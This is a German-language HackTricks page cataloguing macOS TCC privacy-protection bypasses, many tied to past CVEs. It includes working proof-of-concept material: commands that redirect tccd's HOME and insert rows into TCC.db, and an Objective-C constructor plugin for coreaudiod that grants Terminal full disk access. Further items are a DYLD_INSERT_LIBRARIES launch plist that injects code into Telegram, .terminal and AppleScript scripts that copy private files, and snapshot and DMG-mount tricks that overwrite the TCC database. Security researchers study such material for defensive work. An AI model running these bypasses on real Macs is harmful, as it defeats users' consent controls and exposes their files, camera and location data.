# macOS TCC Bypasses

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Nach Funktionalität

### Schreibumgehung

Dies ist keine Umgehung, es ist einfach, wie TCC funktioniert: **Es schützt nicht vor dem Schreiben**. Wenn das Terminal **keinen Zugriff zum Lesen des Desktops eines Benutzers hat, kann es dennoch darin schreiben**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

Der **erweiterte Attribut `com.apple.macl`** wird der neuen **Datei** hinzugefügt, um der **Ersteller-App** Zugriff auf das Lesen zu gewähren.

### TCC ClickJacking

Es ist möglich, **ein Fenster über die TCC-Aufforderung zu legen**, um den Benutzer dazu zu bringen, es **ohne es zu bemerken zu akzeptieren**. Sie finden einen PoC unter [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="https://github.com/carlospolop/hacktricks/blob/de/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC-Anfrage unter beliebigem Namen

Ein Angreifer kann **Apps mit beliebigem Namen** (z. B. Finder, Google Chrome...) in der **`Info.plist`** erstellen und diese dazu bringen, Zugriff auf einen geschützten TCC-Ort anzufordern. Der Benutzer wird denken, dass die legitime Anwendung diejenige ist, die diesen Zugriff anfordert.\
Darüber hinaus ist es möglich, **die legitime App aus dem Dock zu entfernen und die gefälschte darauf zu platzieren**, sodass, wenn der Benutzer auf die gefälschte App klickt (die dasselbe Symbol verwenden kann), diese die legitime aufrufen könnte, um TCC-Berechtigungen anzufordern und Malware auszuführen, sodass der Benutzer glaubt, dass die legitime App den Zugriff angefordert hat.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Weitere Informationen und PoC unter:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH-Bypass

Standardmäßig hatte ein Zugriff über **SSH "Vollen Festplattenzugriff"**. Um dies zu deaktivieren, muss es aufgelistet, aber deaktiviert sein (das Entfernen aus der Liste entfernt diese Berechtigungen nicht):

![](<../../../../../.gitbook/assets/image (569).png>)

Hier finden Sie Beispiele, wie einige **Malwares es geschafft haben, diesen Schutz zu umgehen**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Beachten Sie, dass jetzt, um SSH aktivieren zu können, **Voller Festplattenzugriff** benötigt wird.
{% endhint %}

### Dateierweiterungen behandeln - CVE-2022-26767

Das Attribut **`com.apple.macl`** wird Dateien gegeben, um einer **bestimmten Anwendung Berechtigungen zum Lesen zu geben**. Dieses Attribut wird gesetzt, wenn eine Datei über eine App gezogen wird oder wenn ein Benutzer eine Datei **doppelklickt**, um sie mit der **Standardanwendung** zu öffnen.

Daher könnte ein Benutzer eine bösartige App registrieren, um alle Erweiterungen zu behandeln und Launch Services aufrufen, um **jede Datei zu öffnen** (damit der bösartigen Datei Zugriff gewährt wird, sie zu lesen).

### iCloud

Mit der Berechtigung **`com.apple.private.icloud-account-access`** ist es möglich, mit dem **`com.apple.iCloudHelper`** XPC-Dienst zu kommunizieren, der **iCloud-Token bereitstellt**.

**iMovie** und **Garageband** hatten diese Berechtigung und andere, die erlaubt waren.

Für weitere **Informationen** über den Exploit, um **iCloud-Token** aus dieser Berechtigung zu **erhalten**, überprüfen Sie den Vortrag: [**#OBTS v5.0: "Was auf Ihrem Mac passiert, bleibt in Apples iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Eine App mit der Berechtigung **`kTCCServiceAppleEvents`** kann **andere Apps steuern**. Dies bedeutet, dass sie die Berechtigungen, die anderen Apps gewährt wurden, **missbrauchen könnte**.

Für weitere Informationen zu Apple Scripts siehe:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Wenn eine App z. B. **Automatisierungsberechtigung über `iTerm`** hat, hat in diesem Beispiel **`Terminal`** Zugriff auf iTerm:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Über iTerm

Terminal, der keinen FDA hat, kann iTerm aufrufen, der FDA hat, und ihn verwenden, um Aktionen auszuführen:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}

```bash
osascript iterm.script
```

#### Über Finder

Oder wenn eine App über den Finder Zugriff hat, könnte es ein Skript wie dieses sein:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Nach App-Verhalten

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Der Benutzerbereich **tccd-Dämon** verwendet die **`HOME`** **env**-Variable, um auf die TCC-Benutzerdatenbank von **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** zuzugreifen.

Gemäß [diesem Stack Exchange-Beitrag](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) und da der TCC-Dämon über `launchd` im aktuellen Benutzerbereich ausgeführt wird, ist es möglich, **alle Umgebungsvariablen zu kontrollieren**, die an ihn übergeben werden.\
Daher könnte ein **Angreifer die `$HOME`-Umgebungsvariable** in **`launchctl`** setzen, um auf ein **kontrolliertes Verzeichnis** zu verweisen, den **TCC**-Dämon **neu starten** und dann die **TCC-Datenbank direkt ändern**, um sich **alle verfügbaren TCC-Berechtigungen** zu geben, ohne den Endbenutzer jemals zur Eingabe aufzufordern.\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notizen

Notizen hatten Zugriff auf TCC-geschützte Orte, aber wenn eine Notiz erstellt wird, wird dies **in einem nicht geschützten Ort erstellt**. Daher konnte man Notizen auffordern, eine geschützte Datei in eine Notiz zu kopieren (also an einen nicht geschützten Ort) und dann auf die Datei zuzugreifen:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translokation

Die Binärdatei `/usr/libexec/lsd` mit der Bibliothek `libsecurity_translocate` hatte die Berechtigung `com.apple.private.nullfs_allow`, die es ermöglichte, ein **nullfs**-Laufwerk zu erstellen, und hatte die Berechtigung `com.apple.private.tcc.allow` mit **`kTCCServiceSystemPolicyAllFiles`**, um auf jede Datei zuzugreifen.

Es war möglich, das Quarantäneattribut zu "Library" hinzuzufügen, den **`com.apple.security.translocation`** XPC-Dienst aufzurufen und dann würde Library auf **`$TMPDIR/AppTranslocation/d/d/Library`** gemappt, wo alle Dokumente in Library **zugegriffen** werden konnten.

### CVE-2023-38571 - Musik & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Musik`** hat eine interessante Funktion: Wenn es läuft, werden die in **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** abgelegten Dateien in die "Mediathek" des Benutzers **importiert**. Darüber hinaus ruft es etwas wie auf: \*\*`rename(a, b);**` wobei `a` und `b` sind:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Dieses **`rename(a, b);`**-Verhalten ist anfällig für eine **Race Condition**, da es möglich ist, eine gefälschte **TCC.db**-Datei in den Ordner `Automatically Add to Music.localized` zu legen und dann, wenn der neue Ordner (b) erstellt wird, die Datei zu kopieren, zu löschen und auf **`~/Library/Application Support/com.apple.TCC`**/ zu verweisen.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Wenn **`SQLITE_SQLLOG_DIR="Pfad/Ordner"`** bedeutet dies im Grunde, dass **jede geöffnete Datenbank an diesen Pfad kopiert wird**. In diesem CVE wurde diese Steuerung missbraucht, um innerhalb einer **SQLite-Datenbank zu schreiben**, die von einem Prozess mit FDA der TCC-Datenbank geöffnet wird, und dann **`SQLITE_SQLLOG_DIR`** mit einem **Symlink im Dateinamen** zu missbrauchen, sodass, wenn diese Datenbank **geöffnet** wird, die Benutzer-**TCC.db** mit der geöffneten überschrieben wird.\
**Weitere Informationen** [**im Bericht**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **und** [**in der Präsentation**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Wenn die Umgebungsvariable **`SQLITE_AUTO_TRACE`** gesetzt ist, wird die Bibliothek **`libsqlite3.dylib`** alle SQL-Abfragen protokollieren. Viele Anwendungen verwendeten diese Bibliothek, daher war es möglich, alle ihre SQLite-Abfragen zu protokollieren.

Mehrere Apple-Anwendungen verwendeten diese Bibliothek, um auf TCC-geschützte Informationen zuzugreifen.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Diese **Umgebungsvariable wird vom `Metal`-Framework** verwendet, das eine Abhängigkeit verschiedener Programme darstellt, insbesondere von `Music`, das FDA hat.

Durch das Setzen von `MTL_DUMP_PIPELINES_TO_JSON_FILE="Pfad/Name"`. Wenn `Pfad` ein gültiges Verzeichnis ist, wird der Fehler ausgelöst und wir können `fs_usage` verwenden, um zu sehen, was im Programm passiert:

* Es wird eine Datei `open()`ed, namens `Pfad/.dat.nosyncXXXX.XXXXXX` (X ist zufällig)
* Ein oder mehrere `write()`s schreiben den Inhalt in die Datei (den wir nicht kontrollieren)
* `Pfad/.dat.nosyncXXXX.XXXXXX` wird zu `Pfad/Name` `umbenannt()`

Es handelt sich um einen temporären Dateischreibvorgang, gefolgt von einem **`umbenennen(alter, neuer)`**, **der nicht sicher ist.**

Es ist nicht sicher, da es **die alten und neuen Pfade separat auflösen muss**, was einige Zeit in Anspruch nehmen kann und anfällig für eine Race Condition sein kann. Weitere Informationen finden Sie in der `xnu`-Funktion `renameat_internal()`.

{% hint style="danger" %}
Also, wenn ein privilegierter Prozess beispielsweise aus einem von Ihnen kontrollierten Ordner umbenennt, könnten Sie eine RCE erzielen und ihn dazu bringen, auf eine andere Datei zuzugreifen oder, wie in diesem CVE, die von der privilegierten App erstellte Datei zu öffnen und einen FD zu speichern.

Wenn das Umbenennen auf einen von Ihnen kontrollierten Ordner zugreift, während Sie die Quelldatei geändert haben oder einen FD dazu haben, ändern Sie die Zieldatei (oder den Ordner) so, dass sie auf einen Symlink zeigt, und Sie können schreiben, wann immer Sie möchten.
{% endhint %}

Dies war der Angriff im CVE: Um beispielsweise die `TCC.db` des Benutzers zu überschreiben, können wir:

* `/Users/hacker/ourlink` erstellen, um auf `/Users/hacker/Library/Application Support/com.apple.TCC/` zu verweisen
* das Verzeichnis `/Users/hacker/tmp/` erstellen
* `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` setzen
* den Fehler auslösen, indem Sie `Music` mit dieser Umgebungsvariable ausführen
* den `open()` von `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X ist zufällig) abfangen
* hier öffnen wir diese Datei auch zum Schreiben und behalten den Dateideskriptor bei
* wechseln Sie `/Users/hacker/tmp` atomar mit `/Users/hacker/ourlink` **in einer Schleife**
* Wir tun dies, um unsere Chancen zu maximieren, da das Zeitfenster für das Rennen ziemlich knapp ist, aber das Verlieren des Rennens hat vernachlässigbare Nachteile
* warten Sie einen Moment
* überprüfen, ob wir Glück hatten
* wenn nicht, führen Sie den Vorgang erneut von vorne aus

Weitere Informationen finden Sie unter [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Wenn Sie jetzt versuchen, die Umgebungsvariable `MTL_DUMP_PIPELINES_TO_JSON_FILE` zu verwenden, starten die Apps nicht.
{% endhint %}

### Apple Remote Desktop

Als Root können Sie diesen Dienst aktivieren und der **ARD-Agent hat vollen Festplattenzugriff**, der dann von einem Benutzer missbraucht werden könnte, um ihn dazu zu bringen, eine neue **TCC-Benutzerdatenbank zu kopieren**.

## Durch **NFSHomeDirectory**

TCC verwendet eine Datenbank im HOME-Verzeichnis des Benutzers, um den Zugriff auf benutzerspezifische Ressourcen unter **$HOME/Library/Application Support/com.apple.TCC/TCC.db** zu steuern.\
Daher könnte der Benutzer, wenn es ihm gelingt, TCC mit einer $HOME-Umgebungsvariable zu starten, die auf einen **anderen Ordner zeigt**, eine neue TCC-Datenbank in **/Library/Application Support/com.apple.TCC/TCC.db** erstellen und TCC dazu bringen, einer beliebigen App beliebige TCC-Berechtigungen zu gewähren.

{% hint style="success" %}
Beachten Sie, dass Apple die Einstellung, die im Benutzerprofil im **`NFSHomeDirectory`**-Attribut gespeichert ist, für den **Wert von `$HOME`** verwendet. Wenn Sie also eine Anwendung kompromittieren, die Berechtigungen zum Ändern dieses Werts hat (**`kTCCServiceSystemPolicySysAdminFiles`**), können Sie diese Option mit einem TCC-Bypass **wirksam einsetzen**.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Der **erste POC** verwendet [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) und [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), um das **HOME**-Verzeichnis des Benutzers zu ändern.

1. Erhalten Sie einen _csreq_-Blob für die Ziel-App.
2. Platzieren Sie eine gefälschte _TCC.db_-Datei mit erforderlichem Zugriff und dem _csreq_-Blob.
3. Exportieren Sie den Eintrag des Benutzerverzeichnisdienstes mit [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Ändern Sie den Eintrag des Verzeichnisdienstes, um das Heimatverzeichnis des Benutzers zu ändern.
5. Importieren Sie den modifizierten Eintrag des Verzeichnisdienstes mit [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stoppen Sie den _tccd_ des Benutzers und starten Sie den Prozess neu.

Der zweite POC verwendete **`/usr/libexec/configd`**, das `com.apple.private.tcc.allow` mit dem Wert `kTCCServiceSystemPolicySysAdminFiles` hatte.\
Es war möglich, **`configd`** mit der Option **`-t`** auszuführen. Ein Angreifer konnte eine **benutzerdefinierte Bundle zum Laden** angeben. Daher ersetzt der Exploit die Methode des Änderns des Heimatverzeichnisses des Benutzers durch **`dsexport`** und **`dsimport`** durch eine **`configd`-Codeinjektion**.

Für weitere Informationen lesen Sie den [**Originalbericht**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Durch Prozesseinspritzung

Es gibt verschiedene Techniken, um Code in einen Prozess einzuspritzen und seine TCC-Berechtigungen zu missbrauchen:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Darüber hinaus ist die häufigste Prozesseinspritzung zur Umgehung von TCC über **Plugins (Bibliothek laden)**.\
Plugins sind zusätzlicher Code in Form von Bibliotheken oder Plist, der **von der Hauptanwendung geladen** und unter ihrem Kontext ausgeführt wird. Daher, wenn die Hauptanwendung Zugriff auf TCC-eingeschränkte Dateien hatte (über gewährte Berechtigungen oder Entitlements), wird der **benutzerdefinierte Code dies ebenfalls haben**.

### CVE-2020-27937 - Directory Utility

Die Anwendung `/System/Library/CoreServices/Applications/Directory Utility.app` hatte das Entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, lud Plugins mit der Erweiterung **`.daplug`** und hatte nicht die gehärtete Laufzeitumgebung.

Um diesen CVE zu nutzen, wird das **`NFSHomeDirectory`** (unter Ausnutzung des vorherigen Entitlements) geändert, um in der Lage zu sein, die TCC-Datenbank des Benutzers zu übernehmen, um TCC zu umgehen.

Für weitere Informationen lesen Sie den [**Originalbericht**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Die Binärdatei **`/usr/sbin/coreaudiod`** hatte die Berechtigungen `com.apple.security.cs.disable-library-validation` und `com.apple.private.tcc.manager`. Die erste erlaubt **Code-Injektion** und die zweite gibt Zugriff, um **TCC zu verwalten**.

Diese Binärdatei erlaubte das Laden von **Plug-Ins von Drittanbietern** aus dem Ordner `/Library/Audio/Plug-Ins/HAL`. Daher war es möglich, mit diesem PoC **ein Plugin zu laden und die TCC-Berechtigungen zu missbrauchen**:

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```

Für weitere Informationen siehe den [**Originalbericht**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Geräteabstraktionsschicht (Device Abstraction Layer, DAL) Plug-Ins

Systemanwendungen, die den Kamerastrom über Core Media I/O öffnen (Apps mit **`kTCCServiceCamera`**), laden **in diesem Prozess diese Plugins**, die sich in `/Library/CoreMediaIO/Plug-Ins/DAL` befinden (nicht durch SIP eingeschränkt).

Es reicht aus, dort eine Bibliothek mit dem üblichen **Konstruktor** zu speichern, um **Code einzuschleusen**.

Mehrere Apple-Anwendungen waren anfällig dafür.

### Firefox

Die Firefox-Anwendung hatte die Berechtigungen `com.apple.security.cs.disable-library-validation` und `com.apple.security.cs.allow-dyld-environment-variables`:

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```

Für weitere Informationen darüber, wie man dies leicht ausnutzen kann, [**überprüfen Sie den Originalbericht**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Die Binärdatei `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` hatte die Berechtigungen **`com.apple.private.tcc.allow`** und **`com.apple.security.get-task-allow`**, was es ermöglichte, Code in den Prozess einzuspeisen und die TCC-Berechtigungen zu nutzen.

### CVE-2023-26818 - Telegram

Telegram hatte die Berechtigungen **`com.apple.security.cs.allow-dyld-environment-variables`** und **`com.apple.security.cs.disable-library-validation`**, daher war es möglich, sie zu missbrauchen, um **Zugriff auf ihre Berechtigungen** zu erhalten, wie z.B. das Aufnehmen mit der Kamera. Sie können [**das Payload im Bericht finden**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Beachten Sie, wie man die Umgebungsvariable verwendet, um eine Bibliothek zu laden, ein **benutzerdefiniertes plist** wurde erstellt, um diese Bibliothek einzuspeisen, und **`launchctl`** wurde verwendet, um sie zu starten:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Durch offene Aufrufe

Es ist möglich, **`open`** auch während der Sandboxing-Ausführung aufzurufen.

### Terminal-Skripte

Es ist ziemlich üblich, dem Terminal **Full Disk Access (FDA)** zu gewähren, zumindest in Computern, die von Technikern verwendet werden. Und es ist möglich, **`.terminal`**-Skripte damit aufzurufen.

**`.terminal`**-Skripte sind plist-Dateien wie diese mit dem Befehl, der im Schlüssel **`CommandString`** ausgeführt werden soll:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```

Eine Anwendung könnte ein Terminalskript an einem Ort wie /tmp schreiben und es mit einem Befehl wie folgt starten:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Durch Einhängen

### CVE-2020-9771 - mount\_apfs TCC Umgehung und Privileg Eskalation

**Jeder Benutzer** (auch nicht privilegierte) kann ein Zeitmaschinensnapshot erstellen und einhängen und **ALLE Dateien** dieses Snapshots zugreifen.\
Das **einzige erforderliche Privileg** ist, dass die verwendete Anwendung (wie `Terminal`) Zugriff auf **Vollen Festplattenzugriff** (FDA) (`kTCCServiceSystemPolicyAllfiles`) benötigt, der von einem Administrator gewährt werden muss.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Eine ausführlichere Erklärung finden Sie im [**Originalbericht**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount über TCC-Datei

Auch wenn die TCC-DB-Datei geschützt ist, war es möglich, **eine neue TCC.db-Datei über das Verzeichnis zu mounten**:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Überprüfen Sie den **vollständigen Exploit** im [**ursprünglichen Bericht**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Das Tool **`/usr/sbin/asr`** erlaubte es, die gesamte Festplatte zu kopieren und an einem anderen Ort zu mounten, wodurch die TCC-Schutzmaßnahmen umgangen wurden.

### Standortdienste

Es gibt eine dritte TCC-Datenbank in **`/var/db/locationd/clients.plist`**, um Clients zu kennzeichnen, die auf **Standortdienste zugreifen dürfen**.\
Der Ordner **`/var/db/locationd/` war nicht vor DMG-Mounting geschützt**, daher war es möglich, unser eigenes plist zu mounten.

## Durch Startanwendungen

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Durch grep

In mehreren Fällen werden Dateien sensible Informationen wie E-Mails, Telefonnummern, Nachrichten... an nicht geschützten Orten speichern (was als Sicherheitslücke bei Apple zählt).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Synthetische Klicks

Das funktioniert nicht mehr, aber es [**hat in der Vergangenheit funktioniert**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ein anderer Weg unter Verwendung von [**CoreGraphics-Ereignissen**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Referenz

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Möglichkeiten, Ihre macOS-Datenschutzmechanismen zu umgehen**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
